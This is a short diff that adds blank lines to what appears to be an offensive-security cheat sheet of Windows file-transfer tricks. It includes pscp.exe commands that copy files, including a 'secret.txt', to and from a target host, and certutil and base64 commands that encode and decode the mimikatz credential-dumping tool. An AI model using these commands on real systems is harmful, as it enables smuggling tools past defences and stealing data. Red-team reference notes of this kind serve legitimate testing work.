@@ -92,6 +92,7 @@ https://www.greyhathacker.net/?tag=download-and-execute
 ## ssh / pscp.exe
 
 pscp.exe C:\Users\Public\info.txt user@target:/tmp/info.txt
+
 pscp.exe user@target:/home/user/secret.txt C:\Users\Public\secret.txt
 
 
@@ -107,9 +108,11 @@ https://twitter.com/subtee/status/888122309852016641?lang=en
 ## certutil.exe base64
 
 certutil.exe -encode mimikatz.exe mimikatz.txt
+
 certutil.exe -decode mimikatz.txt mimikatz.exe
 
 cat binary.exe | base64 -w 0
+
 echo {base64_data} | base64 -d > binary.exe
 
 
